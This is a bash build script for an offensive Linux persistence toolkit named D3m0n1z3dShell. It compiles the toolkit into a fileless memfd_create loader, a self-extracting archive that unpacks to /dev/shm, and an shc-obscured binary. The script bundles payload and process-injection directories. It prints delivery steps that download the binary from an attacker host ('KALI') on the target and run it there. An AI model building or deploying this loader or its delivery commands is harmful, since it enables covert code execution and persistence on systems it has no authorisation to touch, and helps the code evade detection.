#!/bin/bash
#
# D3m0n1z3dShell Build System
# Compile the toolkit into standalone binary executables
#
# Usage:
#   ./build.sh              Build fully static ELF binary (default)
#   ./build.sh static       Fully static ELF — zero dependencies on target
#   ./build.sh sfx          Self-extracting archive — needs /bin/sh + tar on target
#   ./build.sh shc          Compile with shc — needs bash on target
#   ./build.sh all          Build all three variants
#   ./build.sh clean        Remove build artifacts
#   ./build.sh help         Show this help
#
# Build Requirements (on Kali / Debian):
#   gcc, binutils (objcopy), tar   → apt install build-essential
#   bash-static                    → apt install bash-static
#   shc (for shc mode only)        → apt install shc
#
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BUILD_DIR="${ROOT_DIR}/build"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

info()  { echo -e "${CYAN}[*]${NC} $*"; }
ok()    { echo -e "${GREEN}[+]${NC} $*"; }
warn()  { echo -e "${YELLOW}[!]${NC} $*"; }
fail()  { echo -e "${RED}[!]${NC} $*" >&2; exit 1; }

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   D3m0n1z3dShell — Binary Build System        ║"
    echo "  ║   Compile to standalone executable             ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

usage() {
    echo -e "${BOLD}Usage:${NC} ./build.sh [mode]"
    echo ""
    echo -e "  ${CYAN}static${NC}   Fully static ELF binary — zero target dependencies ${GREEN}(default)${NC}"
    echo -e "  ${CYAN}sfx${NC}      Self-extracting archive — needs /bin/sh + tar"
    echo -e "  ${CYAN}shc${NC}      Shell script compiler — needs bash on target"
    echo -e "  ${CYAN}all${NC}      Build all three variants"
    echo -e "  ${CYAN}clean${NC}    Remove build/ directory"
    echo -e "  ${CYAN}help${NC}     Show this help"
    echo ""
    echo -e "${BOLD}Output:${NC}"
    echo -e "  build/d3m0nized          Static ELF (from 'static' mode)"
    echo -e "  build/d3m0nized-sfx      Self-extracting archive"
    echo -e "  build/d3m0nized-shc      shc-compiled binary"
    echo ""
    echo -e "${BOLD}Build Requirements (Kali / Debian):${NC}"
    echo -e "  gcc, objcopy (binutils), tar  →  apt install build-essential"
    echo -e "  bash-static                   →  apt install bash-static"
    echo -e "  shc (shc mode only)           →  apt install shc"
}

# ─── Detect architecture for objcopy ───────────────
detect_arch() {
    local arch
    arch=$(uname -m)
    case "$arch" in
        x86_64)       echo "elf64-x86-64 i386:x86-64" ;;
        aarch64)      echo "elf64-littleaarch64 aarch64" ;;
        i686|i386)    echo "elf32-i386 i386" ;;
        armv7l|arm*)  echo "elf32-littlearm arm" ;;
        *)            fail "Unsupported architecture: $arch" ;;
    esac
}

# ─── Check build dependencies ─────────────────────
check_deps() {
    local mode="${1:-static}"
    local missing=()
    for cmd in gcc objcopy tar; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done
    if [[ "$mode" == "shc" ]]; then
        command -v shc &>/dev/null || missing+=("shc")
    fi
    if [[ ${#missing[@]} -gt 0 ]]; then
        fail "Missing tools: ${missing[*]}\n  Install: sudo apt install build-essential bash-static shc"
    fi
}

# ─── Obtain a static bash binary ──────────────────
# NOTE: This function returns the path via stdout, so all status
# messages MUST go to stderr (>&2) to avoid polluting the return value.
get_static_bash() {
    local BASH_OUT="${BUILD_DIR}/bash_static"

    [[ -x "$BASH_OUT" ]] && { echo "$BASH_OUT"; return 0; }

    # Check common system locations
    for p in /bin/bash-static /usr/bin/bash-static /usr/local/bin/bash-static \
             "${ROOT_DIR}/static-binaries/bash"; do
        if [[ -x "$p" ]]; then
            cp "$p" "$BASH_OUT"
            chmod 755 "$BASH_OUT"
            ok "Using static bash from ${p}" >&2
            echo "$BASH_OUT"; return 0
        fi
    done

    # Try installing bash-static package
    info "Static bash not found. Attempting: apt install bash-static ..." >&2
    if sudo apt-get install -y bash-static >&2 2>&1; then
        for p in /bin/bash-static /usr/bin/bash-static; do
            if [[ -x "$p" ]]; then
                cp "$p" "$BASH_OUT"
                chmod 755 "$BASH_OUT"
                ok "bash-static installed" >&2
                echo "$BASH_OUT"; return 0
            fi
        done
    fi

    # Compile bash from source (last resort)
    info "Compiling bash from source (static)..." >&2
    local BASH_VER="5.2.21"
    local SRC_DIR="${BUILD_DIR}/_bash_src"
    mkdir -p "$SRC_DIR"

    local URL="https://ftp.gnu.org/gnu/bash/bash-${BASH_VER}.tar.gz"
    if command -v wget &>/dev/null; then
        wget -q "$URL" -O "${SRC_DIR}/bash.tar.gz"
    elif command -v curl &>/dev/null; then
        curl -sL "$URL" -o "${SRC_DIR}/bash.tar.gz"
    else
        fail "Neither wget nor curl available to download bash source"
    fi

    if [[ -f "${SRC_DIR}/bash.tar.gz" ]]; then
        (
            cd "$SRC_DIR"
            tar xzf bash.tar.gz
            cd "bash-${BASH_VER}"
            CFLAGS="-Os" ./configure --enable-static-link --without-bash-malloc \
                --disable-nls --disable-readline >/dev/null 2>&1
            make -j"$(nproc)" >/dev/null 2>&1
            cp bash "$BASH_OUT"
        )
        chmod 755 "$BASH_OUT"
        rm -rf "$SRC_DIR"
        if [[ -x "$BASH_OUT" ]]; then
            ok "Static bash compiled from source" >&2
            echo "$BASH_OUT"; return 0
        fi
    fi

    rm -rf "$SRC_DIR"
    fail "Cannot obtain static bash.\n  Install: sudo apt install bash-static\n  Or place a static bash binary at: static-binaries/bash"
}

# ════════════════════════════════════════════════════
#  MODE 1: Fully Static ELF Binary (memfd loader)
# ════════════════════════════════════════════════════
build_static() {
    info "Building fully static binary..."
    check_deps static
    mkdir -p "${BUILD_DIR}/obj"

    local BASH_STATIC
    BASH_STATIC=$(get_static_bash)

    # Choose best script to embed (static version is self-contained)
    local SCRIPT
    if [[ -f "${ROOT_DIR}/static/demonizedshell_static.sh" ]]; then
        SCRIPT="${ROOT_DIR}/static/demonizedshell_static.sh"
        info "Embedding self-contained static version"
    else
        SCRIPT="${ROOT_DIR}/demonizedshell.sh"
        warn "Static version not found — embedding main script (needs scripts/ dir)"
    fi

    # Read arch for objcopy
    local arch_info
    arch_info=$(detect_arch)
    local OFMT="${arch_info%% *}"
    local BARCH="${arch_info##* }"

    # Embed bash binary as ELF object
    info "Embedding bash ($(du -sh "$BASH_STATIC" | cut -f1))..."
    cp "$BASH_STATIC" "${BUILD_DIR}/obj/bash"
    ( cd "${BUILD_DIR}/obj" && \
      objcopy -I binary -O "$OFMT" -B "$BARCH" \
        --rename-section .data=.rodata,alloc,load,readonly,data,contents \
        bash bash.o )

    # Embed script as ELF object
    info "Embedding script ($(du -sh "$SCRIPT" | cut -f1))..."
    cp "$SCRIPT" "${BUILD_DIR}/obj/script.sh"
    ( cd "${BUILD_DIR}/obj" && \
      objcopy -I binary -O "$OFMT" -B "$BARCH" \
        --rename-section .data=.rodata,alloc,load,readonly,data,contents \
        script.sh script.o )

    # Write C loader
    cat > "${BUILD_DIR}/obj/loader.c" << 'LOADER_C'
/*
 * D3m0n1z3dShell Loader
 * Runs embedded bash + script entirely from memory via memfd_create.
 * Zero filesystem dependencies — works on minimal/hardened systems.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

/* Symbols from objcopy-embedded blobs */
extern const unsigned char _binary_bash_start[];
extern const unsigned char _binary_bash_end[];
extern const unsigned char _binary_script_sh_start[];
extern const unsigned char _binary_script_sh_end[];

static volatile pid_t g_child = -1;

static void fwd_signal(int sig) {
    if (g_child > 0) kill(g_child, sig);
}

static int write_all(int fd, const void *buf, size_t n) {
    const unsigned char *p = buf;
    while (n > 0) {
        ssize_t w = write(fd, p, n);
        if (w < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        p += (size_t)w;
        n -= (size_t)w;
    }
    return 0;
}

/*
 * Create a memory-backed fd via memfd_create (kernel 3.17+).
 * Falls back to unlinked temp files on older kernels.
 */
static int make_memfd(const char *tag, const void *data, size_t size) {
#ifdef SYS_memfd_create
    int fd = (int)syscall(SYS_memfd_create, tag, 0U);
    if (fd >= 0) {
        if (write_all(fd, data, size) == 0)
            return fd;
        close(fd);
    }
#endif
    /* Fallback: temp file in RAM-backed filesystem */
    static const char *dirs[] = { "/dev/shm", "/tmp", "/var/tmp", NULL };
    char path[256];
    for (int i = 0; dirs[i]; i++) {
        snprintf(path, sizeof(path), "%s/.d3_%s_XXXXXX", dirs[i], tag);
        int tfd = mkstemp(path);
        if (tfd < 0) continue;
        unlink(path);  /* remove name immediately, keep fd open */
        if (fchmod(tfd, 0700) < 0) { close(tfd); continue; }
        if (write_all(tfd, data, size) == 0)
            return tfd;
        close(tfd);
    }
    return -1;
}

int main(int argc, char *argv[], char *envp[]) {
    (void)argc; (void)argv;

    size_t bash_sz   = (size_t)(_binary_bash_end   - _binary_bash_start);
    size_t script_sz = (size_t)(_binary_script_sh_end - _binary_script_sh_start);

    /* Load bash into memory fd */
    int bash_fd = make_memfd("ld", _binary_bash_start, bash_sz);
    if (bash_fd < 0) {
        fprintf(stderr, "[!] Failed to load embedded interpreter\n");
        return 1;
    }

    /* Load script into memory fd */
    int script_fd = make_memfd("rc", _binary_script_sh_start, script_sz);
    if (script_fd < 0) {
        fprintf(stderr, "[!] Failed to load embedded payload\n");
        close(bash_fd);
        return 1;
    }

    /* Build /proc/self/fd paths for execve */
    char bash_path[64], script_path[64];
    snprintf(bash_path,   sizeof(bash_path),   "/proc/self/fd/%d", bash_fd);
    snprintf(script_path, sizeof(script_path), "/proc/self/fd/%d", script_fd);

    /* Forward signals to child */
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = fwd_signal;
    sigaction(SIGINT,  &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);
    sigaction(SIGHUP,  &sa, NULL);

    /* Fork and exec */
    g_child = fork();
    if (g_child < 0) {
        perror("fork");
        return 1;
    }

    if (g_child == 0) {
        /* Child: exec embedded bash with embedded script */
        char *new_argv[] = { (char*)"d3m0nized", script_path, NULL };
        execve(bash_path, new_argv, envp);
        perror("execve");
        _exit(127);
    }

    /* Parent: wait for child */
    int status;
    while (waitpid(g_child, &status, 0) < 0) {
        if (errno != EINTR) break;
    }

    close(bash_fd);
    close(script_fd);

    if (WIFEXITED(status))
        return WEXITSTATUS(status);
    return 128 + WTERMSIG(status);
}
LOADER_C

    # Compile — try static first, fall back to dynamic
    info "Compiling loader..."

    local COMPILED=0
    if gcc -O2 -static -o "${BUILD_DIR}/d3m0nized" \
        "${BUILD_DIR}/obj/loader.c" \
        "${BUILD_DIR}/obj/bash.o" \
        "${BUILD_DIR}/obj/script.o" 2>/dev/null; then
        ok "Linked statically (zero dependencies on target)"
        COMPILED=1
    fi

    if [[ $COMPILED -eq 0 ]]; then
        if gcc -O2 -o "${BUILD_DIR}/d3m0nized" \
            "${BUILD_DIR}/obj/loader.c" \
            "${BUILD_DIR}/obj/bash.o" \
            "${BUILD_DIR}/obj/script.o" 2>&1; then
            warn "Linked dynamically (requires libc — present on virtually all Linux)"
            COMPILED=1
        fi
    fi

    [[ $COMPILED -eq 0 ]] && fail "Compilation failed"

    strip -s "${BUILD_DIR}/d3m0nized" 2>/dev/null || true
    rm -rf "${BUILD_DIR}/obj"

    local SIZE
    SIZE=$(du -sh "${BUILD_DIR}/d3m0nized" | cut -f1)
    echo ""
    ok "Static binary built: ${BOLD}build/d3m0nized${NC} (${SIZE})"
    echo ""
    info "Transfer & run on target:"
    echo -e "    ${CYAN}scp build/d3m0nized user@target:/tmp/${NC}"
    echo -e "    ${CYAN}chmod +x /tmp/d3m0nized && /tmp/d3m0nized${NC}"
    echo ""
    info "Or serve over HTTP:"
    echo -e "    ${CYAN}python3 -m http.server 8080 --directory build/${NC}"
    echo -e "    ${CYAN}# On target: wget http://KALI:8080/d3m0nized -O /tmp/d3m0nized && chmod +x /tmp/d3m0nized && /tmp/d3m0nized${NC}"
}

# ════════════════════════════════════════════════════
#  MODE 2: Self-Extracting Archive
# ════════════════════════════════════════════════════
build_sfx() {
    info "Building self-extracting archive..."
    mkdir -p "$BUILD_DIR"

    local BASH_STATIC
    BASH_STATIC=$(get_static_bash)

    # Stage all project files
    local STAGE="${BUILD_DIR}/_sfx_stage"
    rm -rf "$STAGE"
    mkdir -p "$STAGE/d3m0n/scripts" "$STAGE/d3m0n/payloads"

    cp "$BASH_STATIC" "$STAGE/d3m0n/bash"
    chmod 755 "$STAGE/d3m0n/bash"
    cp "${ROOT_DIR}/demonizedshell.sh" "$STAGE/d3m0n/"

    # Copy scripts
    find "${ROOT_DIR}/scripts" -maxdepth 1 -name '*.sh' -exec cp {} "$STAGE/d3m0n/scripts/" \; 2>/dev/null
    [[ -f "${ROOT_DIR}/scripts/oneline.txt" ]] && cp "${ROOT_DIR}/scripts/oneline.txt" "$STAGE/d3m0n/scripts/"

    # Copy optional directories
    for dir in static static-binaries locutus procinject; do
        [[ -d "${ROOT_DIR}/${dir}" ]] && cp -r "${ROOT_DIR}/${dir}" "$STAGE/d3m0n/"
    done

    info "Creating compressed archive..."
    local ARCHIVE="${BUILD_DIR}/_payload.tar.gz"
    tar czf "$ARCHIVE" -C "$STAGE" d3m0n
    rm -rf "$STAGE"

    # Write self-extracting stub
    cat > "${BUILD_DIR}/d3m0nized-sfx" << 'SFX_STUB'
#!/bin/sh
# D3m0n1z3dShell — Self-Extracting Archive
# Extracts to RAM (/dev/shm), runs with bundled bash, cleans up on exit.
set -e
TMPDIR=""
cleanup() { [ -n "$TMPDIR" ] && rm -rf "$TMPDIR" 2>/dev/null; }
trap cleanup EXIT INT TERM

for d in /dev/shm /tmp /var/tmp; do
    TMPDIR=$(mktemp -d "$d/.d3m0n_XXXXXX" 2>/dev/null) && break
done
[ -z "$TMPDIR" ] && { echo "[!] Cannot create temp directory"; exit 1; }

SKIP=$(awk '/^__D3M0N_ARCHIVE__$/{print NR + 1; exit 0;}' "$0")
[ -z "$SKIP" ] && { echo "[!] Archive marker not found"; exit 1; }

tail -n +"$SKIP" "$0" | tar xz -C "$TMPDIR" 2>/dev/null
[ ! -d "$TMPDIR/d3m0n" ] && { echo "[!] Extraction failed"; exit 1; }

chmod -R +x "$TMPDIR/d3m0n/" 2>/dev/null
cd "$TMPDIR/d3m0n"
exec ./bash demonizedshell.sh "$@"
__D3M0N_ARCHIVE__
SFX_STUB

    cat "$ARCHIVE" >> "${BUILD_DIR}/d3m0nized-sfx"
    chmod +x "${BUILD_DIR}/d3m0nized-sfx"
    rm -f "$ARCHIVE"

    local SIZE
    SIZE=$(du -sh "${BUILD_DIR}/d3m0nized-sfx" | cut -f1)
    echo ""
    ok "Self-extracting archive: ${BOLD}build/d3m0nized-sfx${NC} (${SIZE})"
    echo ""
    info "Requires only /bin/sh and tar on target"
    info "Includes ALL scripts, static binaries, and bundled bash"
    info "Extracts to /dev/shm (RAM), auto-cleans on exit"
}

# ════════════════════════════════════════════════════
#  MODE 3: shc (Shell Script Compiler)
# ════════════════════════════════════════════════════
build_shc() {
    info "Building with shc (Shell Script Compiler)..."

    if ! command -v shc &>/dev/null; then
        warn "shc not installed. Attempting: apt install shc ..."
        sudo apt-get install -y shc 2>/dev/null || \
            fail "Cannot install shc. Run: sudo apt install shc"
    fi

    mkdir -p "$BUILD_DIR"

    local SCRIPT
    if [[ -f "${ROOT_DIR}/static/demonizedshell_static.sh" ]]; then
        SCRIPT="${ROOT_DIR}/static/demonizedshell_static.sh"
        info "Compiling self-contained static version"
    else
        SCRIPT="${ROOT_DIR}/demonizedshell.sh"
        warn "Using main script (needs scripts/ directory alongside binary)"
    fi

    shc -f "$SCRIPT" -o "${BUILD_DIR}/d3m0nized-shc" -r 2>&1

    # shc leaves temp files
    rm -f "${SCRIPT}.x.c" "${SCRIPT}.x" 2>/dev/null

    [[ ! -x "${BUILD_DIR}/d3m0nized-shc" ]] && fail "shc compilation failed"

    strip -s "${BUILD_DIR}/d3m0nized-shc" 2>/dev/null || true

    local SIZE
    SIZE=$(du -sh "${BUILD_DIR}/d3m0nized-shc" | cut -f1)
    echo ""
    ok "shc binary: ${BOLD}build/d3m0nized-shc${NC} (${SIZE})"
    echo ""
    warn "Note: shc binaries still require bash on the target system"
    warn "For targets without bash, use 'static' or 'sfx' mode instead"
}

# ════════════════════════════════════════════════════
#  CLEAN
# ════════════════════════════════════════════════════
do_clean() {
    if [[ -d "$BUILD_DIR" ]]; then
        rm -rf "$BUILD_DIR"
        ok "Build directory removed"
    else
        info "Nothing to clean"
    fi
}

# ════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════
main() {
    banner

    local mode="${1:-static}"

    case "$mode" in
        static)
            build_static
            ;;
        sfx|bundle)
            build_sfx
            ;;
        shc)
            build_shc
            ;;
        all)
            build_static
            echo ""
            echo -e "${CYAN}────────────────────────────────────────${NC}"
            echo ""
            build_sfx
            echo ""
            echo -e "${CYAN}────────────────────────────────────────${NC}"
            echo ""
            build_shc
            echo ""
            echo -e "${CYAN}════════════════════════════════════════${NC}"
            echo ""
            ok "All builds complete:"
            echo -e "  ${GREEN}build/d3m0nized${NC}       — Static ELF (zero deps)"
            echo -e "  ${GREEN}build/d3m0nized-sfx${NC}   — Self-extracting (needs sh+tar)"
            echo -e "  ${GREEN}build/d3m0nized-shc${NC}   — shc compiled (needs bash)"
            ;;
        clean)
            do_clean
            ;;
        help|-h|--help)
            usage
            ;;
        *)
            fail "Unknown mode: $mode\nRun: ./build.sh help"
            ;;
    esac
}

main "$@"
